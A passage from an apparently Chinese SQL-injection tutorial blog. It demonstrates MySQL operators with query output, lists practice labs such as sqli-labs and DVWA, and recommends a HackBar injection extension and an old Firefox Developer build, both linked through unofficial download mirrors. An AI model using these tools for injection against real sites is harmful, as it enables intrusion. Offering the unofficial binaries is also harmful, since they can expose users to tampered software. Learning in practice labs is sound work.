1-2;</span><br><span class="line">+-----+</span><br><span class="line">| 1-2 |</span><br><span class="line">+-----+</span><br><span class="line">|  -1 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2*3;</span><br><span class="line">+-----+</span><br><span class="line">| 2*3 |</span><br><span class="line">+-----+</span><br><span class="line">|   6 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2/3;</span><br><span class="line">+--------+</span><br><span class="line">| 2/3    |</span><br><span class="line">+--------+</span><br><span class="line">| 0.6667 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 10 DIV 4;</span><br><span class="line">+----------+</span><br><span class="line">| 10 DIV 4 |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 10 MOD 4;</span><br><span class="line">+----------+</span><br><span class="line">| 10 MOD 4 |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>SELECT 语句中的条件语句经常要使用比较运算符。通过这些比较运算符，可以判断表中的哪些记录是符合条件的。比较结果为真，则返回 1，为假则返回 0，比较结果不确定则返回 NULL。</p><table><thead><tr><th style="text-align:left">符号</th><th style="text-align:left">描述</th><th style="text-align:left">备注</th></tr></thead><tbody><tr><td style="text-align:left">=</td><td style="text-align:left">等于</td><td style="text-align:left">无</td></tr><tr><td style="text-align:left">&lt;&gt;, !=</td><td style="text-align:left">不等于</td><td style="text-align:left">无</td></tr><tr><td style="text-align:left">&gt;</td><td style="text-align:left">大于</td><td style="text-align:left">无</td></tr><tr><td style="text-align:left">&lt;</td><td style="text-align:left">小于</td><td style="text-align:left">无</td></tr><tr><td style="text-align:left">&lt;=</td><td style="text-align:left">小于等于</td><td style="text-align:left">无</td></tr><tr><td style="text-align:left">&gt;=</td><td style="text-align:left">大于等于</td><td style="text-align:left">无</td></tr><tr><td style="text-align:left">BETWEEN</td><td style="text-align:left">在两值之间</td><td style="text-align:left">&gt;=min&amp;&amp;&lt;=max</td></tr><tr><td style="text-align:left">NOT BETWEEN</td><td style="text-align:left">不在两值之间</td><td style="text-align:left">无</td></tr><tr><td style="text-align:left">IN</td><td style="text-align:left">在集合中</td><td style="text-align:left">无</td></tr><tr><td style="text-align:left">NOT IN</td><td style="text-align:left">不在集合中</td><td style="text-align:left">无</td></tr><tr><td style="text-align:left">&lt;=&gt;</td><td style="text-align:left">严格比较两个NULL值是否相等</td><td style="text-align:left">两个操作码均为NULL时，其所得值为1；而当一个操作码为NULL时，其所得值为0</td></tr><tr><td style="text-align:left">LIKE</td><td style="text-align:left">模糊匹配</td><td style="text-align:left">无</td></tr><tr><td style="text-align:left">REGEXP 或 RLIKE</td><td style="text-align:left">正则式匹配</td><td style="text-align:left">无</td></tr><tr><td style="text-align:left">IS NULL</td><td style="text-align:left">为空</td><td style="text-align:left">无</td></tr><tr><td style="text-align:left">IS NOT NULL</td><td style="text-align:left">不为空</td><td style="text-align:left">无</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 等于</span></span><br><span class="line">mysql&gt; select 2=3;</span><br><span class="line">+-----+</span><br><span class="line">| 2=3 |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line">mysql&gt; select NULL = NULL;</span><br><span class="line">+-------------+</span><br><span class="line">| NULL = NULL |</span><br><span class="line">+-------------+</span><br><span class="line">|        NULL |</span><br><span class="line">+-------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不等于</span></span><br><span class="line">mysql&gt; select 2&lt;&gt;3;</span><br><span class="line">+------+</span><br><span class="line">| 2&lt;&gt;3 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2!=3;</span><br><span class="line">+------+</span><br><span class="line">| 2!=3 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><blockquote><p>安全等于 与 <strong>=</strong> 的区别在于当两个操作码均为 NULL 时，其所得值为 1 而不为 NULL，而当一个操作码为 NULL 时，其所得值为 0而不为 NULL。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&lt;=&gt;3;</span><br><span class="line">+-------+</span><br><span class="line">| 2&lt;=&gt;3 |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select null=null;</span><br><span class="line">+-----------+</span><br><span class="line">| null=null |</span><br><span class="line">+-----------+</span><br><span class="line">|      NULL |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select null&lt;=&gt;null;</span><br><span class="line">+-------------+</span><br><span class="line">| null&lt;=&gt;null |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br><span class="line"># 小于</span><br><span class="line">mysql&gt; select 2&lt;3;</span><br><span class="line">+-----+</span><br><span class="line">| 2&lt;3 |</span><br><span class="line">+-----+</span><br><span class="line">|   1 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line"># 小于等于</span><br><span class="line">mysql&gt; select 2&lt;=3;</span><br><span class="line">+------+</span><br><span class="line">| 2&lt;=3 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line"># 大于</span><br><span class="line">mysql&gt; select 2&gt;3;</span><br><span class="line">+-----+</span><br><span class="line">| 2&gt;3 |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line"># 大于等于</span><br><span class="line">mysql&gt; select 2&gt;=3;</span><br><span class="line">+------+</span><br><span class="line">| 2&gt;=3 |</span><br><span class="line">+------+</span><br><span class="line">|    0 |</span><br><span class="line">+------+</span><br><span class="line"># BETWEEN 在两值之间</span><br><span class="line">mysql&gt; select 5 between 1 and 10;</span><br><span class="line">+--------------------+</span><br><span class="line">| 5 between 1 and 10 |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line"># IN 在集合中</span><br><span class="line">mysql&gt; select 5 in (1,2,3,4,5);</span><br><span class="line">+------------------+</span><br><span class="line">| 5 in (1,2,3,4,5) |</span><br><span class="line">+------------------+</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line"># NOT IN 不再集合中</span><br><span class="line">mysql&gt; select 5 not in (1,2,3,4,5);</span><br><span class="line">+----------------------+</span><br><span class="line">| 5 not in (1,2,3,4,5) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br><span class="line"></span><br><span class="line"># IS NULL 判断是否为空</span><br><span class="line">mysql&gt; select null is NULL;</span><br><span class="line">+--------------+</span><br><span class="line">| null is NULL |</span><br><span class="line">+--------------+</span><br><span class="line">|            1 |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;a&apos; is NULL;</span><br><span class="line">+-------------+</span><br><span class="line">| &apos;a&apos; is NULL |</span><br><span class="line">+-------------+</span><br><span class="line">|           0 |</span><br><span class="line">+-------------+</span><br><span class="line"></span><br><span class="line"># IS NOT NULL 判断是否不为空</span><br><span class="line">mysql&gt; select null IS NOT NULL;</span><br><span class="line">+------------------+</span><br><span class="line">| null IS NOT NULL |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;a&apos; IS NOT NULL;</span><br><span class="line">+-----------------+</span><br><span class="line">| &apos;a&apos; IS NOT NULL |</span><br><span class="line">+-----------------+</span><br><span class="line">|               1 |</span><br><span class="line">+-----------------+</span><br><span class="line"></span><br><span class="line"># LIKE 模糊查询</span><br><span class="line">mysql&gt; select &apos;12345&apos; like &apos;12%&apos;;</span><br><span class="line">+--------------------+</span><br><span class="line">| &apos;12345&apos; like &apos;12%&apos; |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;12345&apos; like &apos;12_&apos;;</span><br><span class="line">+--------------------+</span><br><span class="line">| &apos;12345&apos; like &apos;12_&apos; |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  0 |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;12345&apos; like &apos;%3%&apos;;</span><br><span class="line">+--------------------+</span><br><span class="line">| &apos;12345&apos; like &apos;%3%&apos; |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;12345&apos; like &apos;%5&apos;;</span><br><span class="line">+-------------------+</span><br><span class="line">| &apos;12345&apos; like &apos;%5&apos; |</span><br><span class="line">+-------------------+</span><br><span class="line">|                 1 |</span><br><span class="line">+-------------------+</span><br><span class="line"></span><br><span class="line"># REGEXP 正则匹配</span><br><span class="line">mysql&gt; select &apos;beijing&apos; REGEXP &apos;jing&apos;;</span><br><span class="line">+-------------------------+</span><br><span class="line">| &apos;beijing&apos; REGEXP &apos;jing&apos; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;beijing&apos; REGEXP &apos;xi&apos;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| &apos;beijing&apos; REGEXP &apos;xi&apos; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     0 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;beijing&apos; REGEXP &apos;^b&apos;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| &apos;beijing&apos; REGEXP &apos;^b&apos; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;beijing&apos; REGEXP &apos;g$&apos;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| &apos;beijing&apos; REGEXP &apos;g$&apos; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;beijing&apos; REGEXP &apos;[0-9]&apos;;</span><br><span class="line">+--------------------------+</span><br><span class="line">| &apos;beijing&apos; REGEXP &apos;[0-9]&apos; |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        0 |</span><br><span class="line">+--------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;beijing&apos; REGEXP &apos;[a-z]&apos;;</span><br><span class="line">+--------------------------+</span><br><span class="line">| &apos;beijing&apos; REGEXP &apos;[a-z]&apos; |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        1 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p><table><thead><tr><th style="text-align:left">运算符号</th><th style="text-align:left">作用</th><th></th><th></th></tr></thead><tbody><tr><td style="text-align:left">NOT 或 !</td><td style="text-align:left">逻辑非</td><td></td><td></td></tr><tr><td style="text-align:left">AND 或 &amp;&amp;</td><td style="text-align:left">逻辑与</td><td></td><td></td></tr><tr><td style="text-align:left">OR 或 \</td><td style="text-align:left">\</td><td></td><td>逻辑或</td></tr><tr><td style="text-align:left">XOR 或 ^</td><td style="text-align:left">逻辑异或</td><td></td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"># 与</span><br><span class="line">mysql&gt; select 2 and 0;</span><br><span class="line">+---------+</span><br><span class="line">| 2 and 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2 and 1;</span><br><span class="line">+---------+</span><br><span class="line">| 2 and 1 |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2 &amp;&amp; 0;</span><br><span class="line">+--------+</span><br><span class="line">| 2 &amp;&amp; 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      0 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 或</span><br><span class="line">mysql&gt; select 2 or 0;</span><br><span class="line">+--------+</span><br><span class="line">| 2 or 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2 or 1;</span><br><span class="line">+--------+</span><br><span class="line">| 2 or 1 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 0 or 0;</span><br><span class="line">+--------+</span><br><span class="line">| 0 or 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      0 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 || 0;</span><br><span class="line">+--------+</span><br><span class="line">| 1 || 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line"># 非</span><br><span class="line">mysql&gt; select not 1;</span><br><span class="line">+-------+</span><br><span class="line">| not 1 |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select !0;</span><br><span class="line">+----+</span><br><span class="line">| !0 |</span><br><span class="line">+----+</span><br><span class="line">|  1 |</span><br><span class="line">+----+</span><br><span class="line"></span><br><span class="line"># 异或  </span><br><span class="line"># 如果a、b两个值不相同，则异或结果为1。 如果a、b两个值相同，异或结果为0。</span><br><span class="line">mysql&gt; select 1 xor 1;</span><br><span class="line">+---------+</span><br><span class="line">| 1 xor 1 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 0 xor 0;</span><br><span class="line">+---------+</span><br><span class="line">| 0 xor 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 xor 0;</span><br><span class="line">+---------+</span><br><span class="line">| 1 xor 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 ^ 0;</span><br><span class="line">+-------+</span><br><span class="line">| 1 ^ 0 |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 ^ null;</span><br><span class="line">+----------+</span><br><span class="line">| 1 ^ null |</span><br><span class="line">+----------+</span><br><span class="line">|     NULL |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>位运算符是在二进制数上进行计算的运算符。位运算会先将操作数变成<strong>二进制</strong>数，进行位运算。然后再将计算结果从<strong>二进制数变回十进制数</strong>。</p><table><thead><tr><th style="text-align:left">运算符号</th><th style="text-align:left">作用</th><th></th></tr></thead><tbody><tr><td style="text-align:left">&amp;</td><td style="text-align:left">按位与</td><td></td></tr><tr><td style="text-align:left">\</td><td style="text-align:left"></td><td>按位或</td></tr><tr><td style="text-align:left">^</td><td style="text-align:left">按位异或</td><td></td></tr><tr><td style="text-align:left">!</td><td style="text-align:left">取反</td><td></td></tr><tr><td style="text-align:left">&lt;&lt;</td><td style="text-align:left">左移</td><td></td></tr><tr><td style="text-align:left">&gt;&gt;</td><td style="text-align:left">右移</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 按位与 两个二进位都为1时，结果位才为1</span><br><span class="line">mysql&gt; select 1 &amp; 2;</span><br><span class="line">+-------+</span><br><span class="line">| 1 &amp; 2 |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 &amp; 3;</span><br><span class="line">+-------+</span><br><span class="line">| 1 &amp; 3 |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure><p><code>&amp;&amp;</code>是<strong>逻辑与</strong> 即判断<code>&amp;&amp;</code>两侧的表达式是否都为真，都为真则此<code>&amp;&amp;</code>表达式值为真；</p><p><code>&amp;</code> 是<strong>按位与</strong> 即将<code>&amp;</code>两侧的数用二进制展开，每一位都求与运算(二进制与运算，跟逻辑与差不多)，最后得到的二进制数即为结果；逻辑与结果只讲真和假，而按位与得出的却是实实在在的一个数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 -&gt; 01</span><br><span class="line">2 -&gt; 10</span><br><span class="line">     00</span><br><span class="line"></span><br><span class="line">1 -&gt; 01</span><br><span class="line">3 -&gt; 11</span><br><span class="line">     01</span><br></pre></td></tr></table></figure><h1 id="SQL-注入靶场"><a href="#SQL-注入靶场" class="headerlink" title="SQL 注入靶场"></a>SQL 注入靶场</h1><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><p><strong>项目地址</strong>：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><p>一个比较全的 SQL 注入靶场环境</p><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>项目地址：<a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p><p>经典的综合漏洞靶场环境</p><h2 id="web-for-pentester"><a href="#web-for-pentester" class="headerlink" title="web for pentester"></a>web for pentester</h2><p>官网地址：<a href="https://pentesterlab.com/exercises/web_for_pentester/course" target="_blank" rel="noopener">https://pentesterlab.com/exercises/web_for_pentester/course</a></p><p>常见 Web 漏洞的靶场环境，ISO 文件挂载部署也比较方便</p><h1 id="SQL-注入工具"><a href="#SQL-注入工具" class="headerlink" title="SQL 注入工具"></a>SQL 注入工具</h1><h2 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a>Hackbar</h2><p><strong>手工注入必备工具</strong></p><p>修改了浮夸的界面，爱护眼睛才是第一.感谢r0oth3x49升级！By Darkmelody.</p><table><thead><tr><th style="text-align:left">文件名</th><th style="text-align:left">下载地址</th><th style="text-align:left">备用链接</th></tr></thead><tbody><tr><td style="text-align:left">hackbar.1.6.5.xpi</td><td style="text-align:left"><a href="https://sqlsec.lanzous.com/icgefjg" target="_blank" rel="noopener">蓝奏云</a></td><td style="text-align:left"><a href="https://sqlsec.lanzous.com/icgefjg" target="_blank" rel="noopener">蓝奏云</a></td></tr></tbody></table><p>自从用了这款Hackbar插件后，手工注入的速度大大提高了,通过<code>F9</code>开启和隐藏也十分地方便。</p><h2 id="Firefox-Dev"><a href="#Firefox-Dev" class="headerlink" title="Firefox Dev"></a>Firefox Dev</h2><p>经国光本人一个个测试，最终发现使用 Firefox 的 Dev 版本中的 56.0b9 版本可以完美地安装老版本的Hackbar 插件，安装过后，手工注入的速度嗖嗖的上涨，并且 Firefox 可以完美的导入 BP 的 SSL 证书，很方便我们后期使用 BurpSuite 抓取 HTTPS 网站。</p><table><thead><tr><th style="text-align:left">平台</th><th style="text-align:left">下载地址（官方）</th><th style="text-align:left">备用下载（Onedriver）</th></tr></thead><tbody><tr><td style="text-align:left">Windows64位</td><td style="text-align:left"><a href="https://download-origin.cdn.mozilla.net/pub/devedition/releases/56.0b9/win64/zh-CN/Firefox&gt; Setup 56.0b9.exe" target="_blank" rel="noopener">Firefox Setup 56.0b9.exe</a></td><td style="text-align:left"><a href="https://uijay-my.sharepoint.com/:u:/g/personal/aywtc_myoffice_fun/EWijRJ0ht9JGpq6hgLf1p_wB4KiTII4dO13zJoscBJumPg?e=42yHMf" target="_blank" rel="noopener">Firefox Setup 56.0b9.exe</a></td></tr><tr><td style="text-align:left">Windows32位</td><td style="text-align:left"><a href="https://download-origin.cdn.mozilla.net/pub/devedition/releases/56.0b9/win32/zh-CN/Firefox&gt; Setup 56.0b9.exe" target="_blank" rel="noopener">Firefox Setup 56.0b9.exe</a></td><td style="text-align:left">32位 国光比较懒 不提供备用下载</td></tr><tr><td style="text-align:left">Linux x86_64</td><td style="text-align:left"><a href="https://download-origin.cdn.mozilla.net/pub/devedition/releases/56.0b9/linux-x86_64/zh-CN/firefox-56.0b9.tar.bz2" target="_blank" rel="noopener">firefox-56.0b9.tar.bz2</a></td><td style="text-align:left"><a href="https://uijay-my.sharepoint.com/:u:/g/personal/aywtc_myoffice_fun/EXsb9L6QavpDhXr_neUtAJwBEl_70ztxfa3FJULklgmXjg?e=KhQIlL" target="_blank" rel="noopener">firefox-56.0b9.tar.bz2</a></td></tr><tr><td style="text-align:left">macOS</td><td style="text-align:left"><a href="https://download-origin.cdn.mozilla.net/pub/devedition/releases/56.0b9/mac/zh-CN/Firefox&gt; 56.0b9.dmg" target="_blank" rel="noopener">Firefox 56.0b9.dmg</a></td><td style="text-align:left"><a href="https://uijay-my.sharepoint.com/:u:/g/personal/aywtc_myoffice_fun/EfirSMz2pNxNsD6QqiNVzksBHvhlo8Tza1GbE13D0CthPQ?e=aP6UiN" target="_blank" rel="noopener">Firefox 56.0b9.dmg</a></td></tr></tbody></table><p><strong>关闭自动更新</strong></p><p>首先下载完启动<code>Firefox Developer 